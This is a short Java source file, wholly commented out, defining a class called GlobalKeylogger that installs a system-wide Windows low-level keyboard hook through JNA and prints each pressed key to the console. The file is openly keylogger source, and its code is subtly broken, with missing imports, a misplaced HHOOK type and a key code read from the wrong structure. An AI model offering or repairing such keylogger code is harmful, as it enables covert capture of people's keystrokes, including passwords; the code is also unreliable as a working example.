//package com.revature;
//import com.sun.jna.Native;
//import com.sun.jna.Pointer;
//import com.sun.jna.win32.StdCallLibrary;
//import com.sun.jna.win32.WinDef;
//
//public class GlobalKeylogger {
//
//    public interface User32 extends StdCallLibrary {
//        User32 INSTANCE = Native.load("user32", User32.class);
//        
//        WinDef.HHOOK SetWindowsHookEx(int idHook, HOOKPROC lpfn, HMODULE hMod, int dwThreadId);
//        boolean UnhookWindowsHookEx(WinDef.HHOOK hhk);
//        WinDef.LRESULT CallNextHookEx(WinDef.HHOOK hhk, int nCode, WinDef.WPARAM wParam, WinDef.LPARAM lParam);
//        
//        int WH_KEYBOARD_LL = 13;
//        int WM_KEYDOWN = 0x0100;
//        
//        interface HOOKPROC extends StdCallCallback {
//            WinDef.LRESULT callback(int nCode, WinDef.WPARAM wParam, WinDef.LPARAM lParam);
//        }
//    }
//    
//    public static void main(String[] args) {
//        User32.HHOOK hook = User32.INSTANCE.SetWindowsHookEx(
//            User32.WH_KEYBOARD_LL,
//            (nCode, wParam, lParam) -> {
//                if (wParam.intValue() == User32.WM_KEYDOWN) {
//                    int vkCode = lParam.getPointer().getByte(0);
//                    System.out.println("Key pressed: " + (char) vkCode);
//                }
//                return User32.INSTANCE.CallNextHookEx(null, nCode, wParam, lParam);
//            },
//            null,
//            0
//        );
//        
//        // Keep the program running to capture keystrokes
//        try {
//            Thread.sleep(Long.MAX_VALUE);
//        } catch (InterruptedException e) {
//            e.printStackTrace();
//        }
//        
//        User32.INSTANCE.UnhookWindowsHookEx(hook);
//    }
//}
